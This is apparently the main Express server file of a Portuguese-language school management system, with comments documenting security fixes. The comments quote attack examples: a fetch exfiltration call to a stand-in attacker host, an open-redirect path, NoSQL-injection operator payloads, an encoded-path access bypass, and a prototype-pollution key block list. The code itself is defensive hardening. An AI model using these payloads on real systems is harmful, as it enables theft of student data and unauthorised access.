const express = require('express');
const path = require('path');
const cookieParser = require('cookie-parser');
const cors = require('cors');
const helmet = require('helmet');
const compression = require('compression');
const apiRoutes = require('./routes/api');
const { sanitizeObject, sanitizeInput } = require('./utils/sanitize');
const { csrfCookieSetter, csrfValidator } = require('./middleware/csrfProtection');
const logger = require('./utils/logger');
const { requestLogger } = require('./middleware/requestLogger');

const app = express();

// Otimização de Performance: Compressão Gzip/Brotli
app.use(compression());

// Monitoramento e Observabilidade: Métricas HTTP (Roadmap #6)
app.use(requestLogger);

// Correlaciona requisição ↔ trace ↔ erro e devolve X-Trace-Id ao cliente.
// Vira no-op quando a observabilidade está desligada (que é o padrão).
const observability = require('./observability');
app.use(observability.middleware.request);

// Configurar Trust Proxy para o Render (Necessário para express-rate-limit)
app.set('trust proxy', 1);

// NOTA: O redirecionamento HTTP -> HTTPS já é feito pelo próprio Render na
// borda da rede, antes da requisição chegar a este app (toda requisição que
// chega aqui internamente já passou por HTTPS na entrada do Render).
// Um middleware adicional aqui que dependa do header 'x-forwarded-proto'
// pode disparar redirects indevidos sempre que esse header vier ausente ou
// inconsistente em alguma requisição — inclusive na navegação principal da
// página, o que recarregava o site inteiro de forma intermitente e
// aparentemente aleatória. Por isso esse middleware foi removido.

// Raiz do frontend estático — definida aqui porque a CSP precisa varrer os
// HTML servidos para hashear os scripts inline (ver utils/cspHashes.js).
const frontendRootPath = path.join(__dirname, '../../');
const { obterHashes } = require('./utils/cspHashes');

// Middleware de Segurança (Helmet)
// ============================================
// `script-src: 'unsafe-inline'` foi REMOVIDO. Ele autorizava QUALQUER script
// inline, o que anula na prática a defesa da CSP contra XSS: um script
// injetado executava igual a um legítimo.
//
// Os ~31 blocos inline do frontend legado agora são autorizados um a um por
// hash SHA-256 do próprio conteúdo, calculado dos mesmos arquivos que o
// servidor entrega. Script com conteúdo diferente (isto é, injetado) não bate
// com nenhum hash e não executa. Como a política passa a conter hashes, o
// browser ignora `'unsafe-inline'` mesmo se alguém o reintroduzir por engano.
//
// Restam os handlers inline (`onclick=`), cobertos por `script-src-attr` —
// diretiva separada, endurecida abaixo.
// ============================================
app.use(
    helmet({
        contentSecurityPolicy: {
            directives: {
                'default-src': ["'self'"],
                // Função: helmet reavalia por resposta, o que permite ao cache de
                // hashes revalidar por mtime em desenvolvimento (editar um script
                // inline não exige reiniciar o servidor).
                'script-src': [
                    "'self'",
                    ...[
                        'cdn.jsdelivr.net',
                        'unpkg.com',
                        'cdnjs.cloudflare.com',
                        'cdn.tailwindcss.com',
                        'https://accounts.google.com',
                    ],
                    () => obterHashes(frontendRootPath).join(' '),
                ],
                // Handlers inline (onclick=...) do HTML legado. Continua sendo uma
                // exceção, mas MUITO mais estreita que a anterior: vale só para
                // atributos de evento, nunca para blocos <script>. Fechar isto de
                // vez exige reescrever os ~174 handlers como addEventListener.
                'script-src-attr': ["'unsafe-inline'"],
                'style-src': [
                    "'self'",
                    "'unsafe-inline'",
                    'cdn.jsdelivr.net',
                    'fonts.googleapis.com',
                    'unpkg.com',
                    'cdnjs.cloudflare.com',
                    'https://accounts.google.com',
                ],
                'font-src': ["'self'", 'cdn.jsdelivr.net', 'fonts.gstatic.com', 'data:'],
                // Google profile photos (lh3.googleusercontent.com) + blobs/data URIs
                'img-src': [
                    "'self'",
                    'data:',
                    'blob:',
                    'https://lh3.googleusercontent.com',
                    'https://lh4.googleusercontent.com',
                    'https://lh5.googleusercontent.com',
                    'https://lh6.googleusercontent.com',
                ],
                'media-src': ["'self'", 'blob:'],
                // ============================================
                // connect-src — ALLOWLIST, sem esquemas curinga
                // ============================================
                // A lista terminava em `https: http: ws: wss:`, que autoriza QUALQUER
                // host. Isso reabre justamente o que o resto da CSP fecha: um script
                // que consiga executar (via `script-src-attr: 'unsafe-inline'`, ainda
                // aberto para os ~174 handlers legados) podia fazer
                // `fetch('https://servidor-do-atacante/', {method:'POST', body: ...})`
                // e drenar nota, frequência e dado de menor sem obstáculo nenhum.
                // A CSP só vira barreira de EXFILTRAÇÃO quando o destino é enumerado.
                //
                // Cada entrada abaixo tem um chamador real no código:
                //   - onrender.com  → a própria API em produção (HTTP e WebSocket);
                //   - localhost/127 → dev (Vite, Live Server, socket.io local);
                //   - viacep        → busca de endereço por CEP no cadastro;
                //   - *.google*     → OAuth (o portal chama oauth2/www.googleapis);
                //   - CDNs          → mesmas de `script-src`, que buscam chunks e
                //                     sourcemaps por fetch.
                // `data:`/`blob:` ficam: são origens locais ao documento, não dão
                // saída para a rede.
                'connect-src': [
                    "'self'",
                    'https://sistema-escolar-bfty.onrender.com',
                    'wss://sistema-escolar-bfty.onrender.com',
                    'http://localhost:*',
                    'http://127.0.0.1:*',
                    'ws://localhost:*',
                    'ws://127.0.0.1:*',
                    'https://viacep.com.br',
                    'https://accounts.google.com',
                    'https://oauth2.googleapis.com',
                    'https://www.googleapis.com',
                    'https://cdn.jsdelivr.net',
                    'https://cdnjs.cloudflare.com',
                    'https://unpkg.com',
                    'https://cdn.tailwindcss.com',
                    'data:',
                    'blob:',
                ],
                'frame-src': ["'self'", 'https://accounts.google.com'], // Necessário para o Iframe de login do Google
                'frame-ancestors': ["'none'"], // Proteção extra contra Clickjacking
                'base-uri': ["'self'"], // Previne ataques de base tag injection
                'form-action': ["'self'"], // Previne submissão de formulários para domínios externos
            },
        },
        // ============================================
        // CLICKJACKING — defesa explícita em duas camadas
        // ============================================
        // `frame-ancestors 'none'` (CSP, acima) é o controle moderno, mas não é
        // honrado por browsers antigos. O X-Frame-Options cobre esse resto.
        // Deixado EXPLÍCITO em DENY em vez de herdar o SAMEORIGIN padrão do helmet:
        // além de ser mais restritivo, torna a intenção auditável e consistente com
        // o `frame-ancestors 'none'` — antes as duas diretivas discordavam.
        xFrameOptions: { action: 'deny' },

        // Não vaza a URL completa (que pode conter ids de aluno/turma no path) para
        // terceiros ao navegar para fora ou carregar recurso externo.
        referrerPolicy: { policy: 'strict-origin-when-cross-origin' },

        // HSTS: 1 ano, subdomínios incluídos. Impede downgrade para HTTP.
        hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },

        // Necessário para o popup do Google OAuth comunicar de volta com a página pai
        crossOriginOpenerPolicy: { policy: 'same-origin-allow-popups' },
        crossOriginEmbedderPolicy: false, // Desabilitado para compatibilidade com CDNs
    })
);

// Cabeçalhos anti-clickjacking também nas respostas de arquivo estático e nas
// páginas de erro, que em alguns caminhos não passam pela cadeia acima.
app.use((req, res, next) => {
    res.setHeader('X-Frame-Options', 'DENY');
    next();
});

// ============================================
// SERVIR ARQUIVOS ESTÁTICOS (Antes de qualquer rate limiter)
// ============================================
// `frontendRootPath` já declarado acima (a CSP precisa dele antes do helmet).
const staticDirectories = [
    'css',
    'js',
    'img',
    'html',
    'detalhes',
    'direcao',
    'graficos',
    'favicon',
    'portal-responsavel/dist',
];
const staticFiles = [
    'index.html',
    'manifest.json',
    'sw.js',
    'service-worker.js',
    'favicon.ico',
    'favicon.svg',
];
const staticOptions = {
    setHeaders: (res, filePath) => {
        if (filePath.endsWith('.woff2')) res.setHeader('Content-Type', 'font/woff2');
        if (filePath.endsWith('.woff')) res.setHeader('Content-Type', 'font/woff');
    },
};

// ============================================
// GATE DAS ÁREAS RESTRITAS — ANTES DO express.static
// ============================================
// A ordem é a proteção: se este middleware ficasse depois do static, o Express
// já teria respondido com o arquivo e o gate nunca rodaria.
//
// É registrado SEM prefixo de propósito. Montá-lo em `app.use('/html/admin')`
// deixava o gate casar o caminho cru enquanto o static resolvia o caminho
// decodificado — e `/html/%61dmin/usuarios.html` entregava a página a um
// anônimo. Ver middleware/protegerPaginas.js.
// ============================================
// URL CANÔNICA — colapsa barras repetidas ANTES de qualquer coisa
// ============================================
// `https://host//html/<area>/usuarios.html` (barra dupla) entregava o HTML,
// porque a normalização do caminho acontece no servidor. O NAVEGADOR, porém,
// não normaliza: os `<link href="../../css/x.css">` da página sobem dois níveis
// a partir de `//html/<area>/` e viram `//css/x.css` — que o browser interpreta
// como URL protocol-relative, ou seja, OUTRO HOST. Resultado: a página abre
// sem CSS nenhum e parece quebrada.
//
// Fora da área com apelido isso dava 404 (o express.static não casa o caminho
// cru). Dentro dela passou a servir 200, porque a reescrita do apelido
// normaliza o caminho antes do static. Meia-vitória é o pior dos casos: a
// página carrega, mas sem estilo.
//
// O redirect resolve na origem — qualquer link com barra sobrando se corrige
// sozinho e os caminhos relativos voltam a resolver.
//
// SEGURANÇA: o colapso reduz QUALQUER sequência de barras a uma só, então o
// destino sempre começa com exatamente um `/`. Sem isso, um caminho como
// `//evil.com/x` viraria `Location: //evil.com/x` — protocol-relative — e o
// redirect levaria a pessoa para fora do domínio.
//
// Vem ANTES do gate de propósito: menos variantes de caminho chegando à
// decisão de autorização é menos superfície para divergência.
app.use((req, res, next) => {
    if (!req.path.includes('//')) return next();

    const canonico = req.path.replace(/\/{2,}/g, '/');
    const query = req.url.slice(req.path.length);
    return res.redirect(308, canonico + query);
});

app.use(require('./middleware/protegerPaginas').protegerAreasRestritas(frontendRootPath));

staticDirectories.forEach((directory) => {
    app.use(`/${directory}`, express.static(path.join(frontendRootPath, directory), staticOptions));
});

staticFiles.forEach((file) => {
    app.get(`/${file}`, (req, res) => {
        res.sendFile(path.join(frontendRootPath, file));
    });
});

// Raiz do site → landing page
app.get('/', (req, res) => {
    res.sendFile(path.join(frontendRootPath, 'index.html'));
});

// ============================================
// RATE LIMITING — por IP **e** por CONTA
// ============================================
// Antes todos os limiters eram keyed só por IP, o que não segura brute force
// de verdade: com um pool de IPs (botnet, VPN rotativa, ou um único /64 IPv6)
// o atacante martela a mesma conta e cada request cai numa chave nova.
// Agora os endpoints sensíveis passam por dois limiters em série — um keyed
// pelo IP (normalizado para /64 em IPv6) e outro pelo e-mail/CPF alvo.
// Detalhes e limites em middleware/rateLimiters.js.
const isProduction = process.env.NODE_ENV === 'production';
const isTest = process.env.NODE_ENV === 'test';

const {
    globalLimiter,
    authIpLimiter,
    authContaLimiter,
    codeIpLimiter,
    codeContaLimiter,
    authPrefixLimiter,
} = require('./middleware/rateLimiters');

// Aplicar o globalLimiter APENAS em rotas /api
app.use('/api', globalLimiter);

// ============================================
// CORS — ALLOWLIST ESTRITA (nunca reflete a Origin recebida)
// ============================================
// O bloco anterior devolvia `callback(null, true)` para QUALQUER origin sempre
// que NODE_ENV !== 'production'. Combinado com `credentials: true`, isso é uma
// origem refletida: o browser passa a autorizar qualquer site a ler respostas
// autenticadas com o cookie de sessão da vítima — CSRF de leitura completo.
// E bastava a variável NODE_ENV não chegar exatamente como 'production' num
// deploy para o buraco valer em produção.
//
// Agora a allowlist é a MESMA em todo ambiente. O que muda em dev é apenas a
// adição explícita de localhost/127.0.0.1 (qualquer porta), nunca um curinga.
const allowedOrigins = [
    'http://localhost:3000',
    'http://localhost:3001',
    'http://localhost:5173',
    'http://localhost:5174',
    'http://localhost:5500',
    'http://127.0.0.1:3001',
    'http://127.0.0.1:5500',
    'https://sistema-escolar-bfty.onrender.com',
    process.env.FRONTEND_URL,
].filter(Boolean); // Remove undefined/null

// Origens extras liberadas por ambiente (lista separada por vírgula).
// Permite adicionar um domínio de staging sem reabrir a reflexão geral.
(process.env.CORS_EXTRA_ORIGINS || '')
    .split(',')
    .map((o) => o.trim())
    .filter(Boolean)
    .forEach((o) => {
        allowedOrigins.push(o);
    });

// Apenas fora de produção: loopback em qualquer porta (Vite, Live Server…).
const LOOPBACK_DEV = /^https?:\/\/(localhost|127\.0\.0\.1|\[::1\]):\d+$/;

function origemPermitida(origin) {
    if (allowedOrigins.includes(origin)) return true;
    if (!isProduction && LOOPBACK_DEV.test(origin)) return true;
    return false;
}

app.use(
    cors({
        origin: (origin, callback) => {
            // Sem header Origin = requisição não-browser (curl, Postman, app mobile,
            // health check). Não há política de mesma origem a violar e nenhum
            // cookie é anexado automaticamente, então liberar aqui não expõe nada.
            if (!origin) return callback(null, true);

            if (origemPermitida(origin)) {
                return callback(null, true);
            }

            console.error(`❌ Bloqueado por CORS: ${origin}`);
            // Erro SEM ecoar a origin recebida: a mensagem volta ao cliente pelo
            // handler global e refletir input do atacante ali é desnecessário.
            //
            // `status = 403` é essencial: sem ele o handler global trata como 500 e
            // dispara um alerta FATAL 'UNHANDLED_ERROR'. Origem bloqueada é o
            // funcionamento ESPERADO do controle — qualquer um inundaria o canal de
            // alertas só mandando requests com Origin aleatória.
            const erro = new Error('Origem não autorizada');
            erro.status = 403;
            return callback(erro);
        },
        credentials: true,
        methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
        allowedHeaders: [
            'Content-Type',
            'Authorization',
            'x-migration-key',
            'X-API-Key',
            'X-CSRF-Token',
        ],
        // Sem isso o browser refaz o preflight a cada request.
        maxAge: 600,
    })
);

app.use(cookieParser());

// ============================================
// SESSÃO PERSISTENTE (express-session + connect-mongo)
// Usada para o contexto multi-escola (escolaAtivaId). A AUTENTICAÇÃO
// continua 100% via JWT em cookie HttpOnly — a sessão guarda apenas o
// estado de navegação (qual escola o usuário está operando).
// Em testes (sem MONGODB_URI) usa o MemoryStore padrão.
// ============================================
const session = require('express-session');
const sessionOptions = {
    name: 'escola_sess',
    secret: process.env.SESSION_SECRET || process.env.JWT_SECRET || 'escola-sess-jest-fallback',
    resave: false,
    saveUninitialized: false,
    cookie: {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'Lax',
        maxAge: 8 * 60 * 60 * 1000, // mesmo horizonte do JWT (8h)
    },
};
if (process.env.MONGODB_URI && process.env.NODE_ENV !== 'test') {
    const connectMongo = require('connect-mongo');
    const MongoStore = connectMongo.default || connectMongo; // compat CJS/ESM
    sessionOptions.store = MongoStore.create({
        mongoUrl: process.env.MONGODB_URI,
        dbName: process.env.MONGODB_DB_NAME || undefined,
        collectionName: 'sessions',
        ttl: 8 * 60 * 60,
    });
}
app.use(session(sessionOptions));

// Body Parser - Limite reduzido para 1MB para prevenir DoS
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true, limit: '1mb' }));

// Middlewares locais para uploads de fotos (permitem até 10MB)
const photoLimit = express.json({ limit: '10mb' });
app.use('/api/alunos', (req, res, next) =>
    req.method === 'POST' ? photoLimit(req, res, next) : next()
);
app.use('/api/upload/photo', photoLimit);
// Upload de foto de perfil via base64 — precisa do limite estendido
app.use('/api/usuarios/foto', (req, res, next) =>
    req.method === 'PUT' ? photoLimit(req, res, next) : next()
);
// Comunicados podem include imagens base64 — precisa do limite estendido
app.use('/api/comunicados', (req, res, next) =>
    req.method === 'POST' || req.method === 'PUT' ? photoLimit(req, res, next) : next()
);

// Sanitização Global de Inputs (XSS e NoSQL Injection Protection)
// req.query e req.params também passam aqui: com `extended: true` o Express
// transforma ?campo[$ne]=x num OBJETO, que ia direto para o filtro Mongo dos
// controllers (ex.: /api/professores?ativo[$ne]=false devolvia a rede inteira).
app.use((req, res, next) => {
    // O body precisa das DUAS passagens: sanitizeObject cuida do XSS nas
    // strings, removerOperadoresMongoProfundo remove os operadores de consulta.
    if (req.body) {
        sanitizeObject(req.body);
        removerOperadoresMongoProfundo(req.body);
    }
    if (req.query) removerOperadoresMongo(req.query);
    if (req.params) removerOperadoresMongo(req.params);
    next();
});

/**
 * Remove chaves iniciadas por '$' e achata objetos aninhados em query/params.
 * `req.query` é getter-only no Express 5 — por isso mutamos no lugar.
 */
function removerOperadoresMongo(alvo) {
    if (!alvo || typeof alvo !== 'object') return;
    Object.keys(alvo).forEach((chave) => {
        if (chave.startsWith('$')) {
            delete alvo[chave];
            return;
        }
        const valor = alvo[chave];
        if (Array.isArray(valor)) {
            // ?t[]=a&t[]=b é legítimo: mantém, mas só com valores escalares
            alvo[chave] = valor
                .filter((v) => typeof v !== 'object' || v === null)
                .map((v) => (typeof v === 'string' ? sanitizeInput(v) : v));
        } else if (valor && typeof valor === 'object') {
            // ?campo[$ne]=x → objeto. Nada legítimo em query string precisa
            // de operadores Mongo, então o parâmetro inteiro é descartado.
            delete alvo[chave];
        } else if (typeof valor === 'string') {
            alvo[chave] = sanitizeInput(valor);
        }
    });
}

/**
 * NoSQL INJECTION NO BODY.
 *
 * `sanitizeObject` percorria o body recursivamente mas só limpava HTML das
 * strings — as CHAVES passavam intactas. Um JSON como
 *     { "email": { "$ne": null }, "senha": { "$gt": "" } }
 * chegava inteiro ao controller e virava operador de consulta no Mongo.
 * (No /login o `email.toLowerCase()` estourava com TypeError → 500, um acidente
 * feliz; mas qualquer outro handler que jogue um campo do body direto num
 * filtro estava exposto.)
 *
 * Diferente da versão de query/params, aqui NÃO descartamos objetos aninhados:
 * o body legítimo tem estrutura (segundoResponsavel, lgpdConsents,
 * pessoasAutorizadas…). Removemos apenas as chaves perigosas, recursivamente:
 *   - `$...`  → operador de consulta;
 *   - `a.b`   → notação de caminho, usada para escrever campo aninhado
 *               arbitrário num $set;
 *   - chaves de poluição de prototype.
 */
const CHAVES_PROIBIDAS = new Set(['__proto__', 'constructor', 'prototype']);
const PROFUNDIDADE_MAX = 12;

function removerOperadoresMongoProfundo(alvo, profundidade = 0) {
    if (!alvo || typeof alvo !== 'object' || profundidade > PROFUNDIDADE_MAX) return;

    if (Array.isArray(alvo)) {
        alvo.forEach((item) => {
            removerOperadoresMongoProfundo(item, profundidade + 1);
        });
        return;
    }

    Object.keys(alvo).forEach((chave) => {
        if (chave.startsWith('$') || chave.includes('.') || CHAVES_PROIBIDAS.has(chave)) {
            delete alvo[chave];
            return;
        }
        removerOperadoresMongoProfundo(alvo[chave], profundidade + 1);
    });
}

// ============================================
// PROTEÇÍO CSRF (Double Submit Cookie)
// ============================================
// 1. Define o cookie CSRF em toda resposta
app.use(csrfCookieSetter);
// 2. Valida o token CSRF em rotas que mudam estado (POST/PUT/DELETE)
app.use('/api', csrfValidator);

// Aplicar limiters específicos antes das rotas gerais.
// Os mais restritivos vêm primeiro: /api/auth/2fa/* precisa do codeLimiter
// e não apenas do authLimiter herdado do prefixo.
//
// NOTA DE ORDEM: estes limiters ficam DEPOIS do express.json() de propósito —
// o limiter por conta lê o e-mail/CPF de `req.body` para montar a chave.
const limitarCodigo = [codeIpLimiter, codeContaLimiter];
app.use('/api/auth/2fa/verify', limitarCodigo);
app.use('/api/auth/2fa/send', limitarCodigo);
app.use('/api/auth/validate-code', limitarCodigo);
app.use('/api/auth/verify-recovery-code', limitarCodigo);
app.use('/api/responsavel/vincular', limitarCodigo);
app.use('/api/responsavel/buscar-aluno', limitarCodigo);

// Os três endpoints historicamente mais atacados mantêm o teto mais baixo
const limitarAuth = [authIpLimiter, authContaLimiter];
app.use('/api/auth/login', limitarAuth);
app.use('/api/auth/forgot-password', limitarAuth);
app.use('/api/auth/reset-password', limitarAuth);

// Todo o restante do prefixo /api/auth — cadastro, ativação e 2FA.
// Antes só login/forgot/reset eram cobertos, deixando register-diretor,
// register-code e os endpoints de 2FA sem qualquer freio.
app.use('/api/auth', authPrefixLimiter);

// Rotas
app.use('/api', apiRoutes);

// GET /api/health/observability — diz quais provedores estão ligados.
// Nunca expõe DSN, chave ou endpoint.
observability.middleware.mountHealth(app);

// POST /api/observability/frontend-error — coletor de erros do navegador.
// O front não fala com o Sentry direto por causa da CSP; ver middleware.js.
observability.middleware.mountFrontendCollector(app);

// 404 global: rota desconhecida NÃO mascara mais como landing page.
// API → JSON; navegação → página de erro amigável (dark theme) com
// retorno seguro ao painel do perfil logado.
app.use((req, res) => {
    if (req.path.startsWith('/api')) {
        return res.status(404).json({ success: false, error: 'Endpoint não encontrado' });
    }
    res.status(404).sendFile(path.join(frontendRootPath, 'html', '404.html'));
});

// Reporta 5xx aos provedores ativos e repassa o erro. Fica ANTES do handler
// abaixo de propósito: só observa, quem responde ao cliente é o handler final.
app.use(observability.middleware.errorHandler);

// Tratamento de Erro (Opaco em Produção — não vaza stack traces)
app.use((err, req, res, next) => {
    // Payload Too Large — imagens muito grandes
    if (err.type === 'entity.too.large' || err.status === 413) {
        return res.status(413).json({
            success: false,
            error: 'O tamanho total das imagens excede o limite permitido (10MB). Reduza o tamanho ou quantidade das imagens.',
        });
    }

    const statusCode = err.status || 500;

    // O stack vai para o LOG em produção também — é lá que ele é indispensável.
    // O que não pode vazar é para a RESPOSTA, e isso é tratado abaixo.
    // requestId/userId/escolaId entram sozinhos pelo contexto da requisição.
    logger.error(`[Error Handler] ${err.message}`, { err, status: statusCode });

    // Alerta automático para erros 5xx no handler global
    if (statusCode >= 500) {
        logger.alert('UNHANDLED_ERROR', err.message, { status: statusCode });
    }

    const isProduction = process.env.NODE_ENV === 'production';

    // Navegação de página (não-API, aceita HTML) → página de erro amigável
    const wantsHtml = !req.path.startsWith('/api') && req.accepts(['json', 'html']) === 'html';
    if (wantsHtml && statusCode >= 500) {
        return res.status(statusCode).sendFile(path.join(frontendRootPath, 'html', '500.html'));
    }

    res.status(statusCode).json({
        success: false,
        message: isProduction ? 'Erro interno do servidor.' : err.message,
        // Detalhes extras apenas em dev
        error: isProduction ? {} : err,
    });
});

module.exports = app;
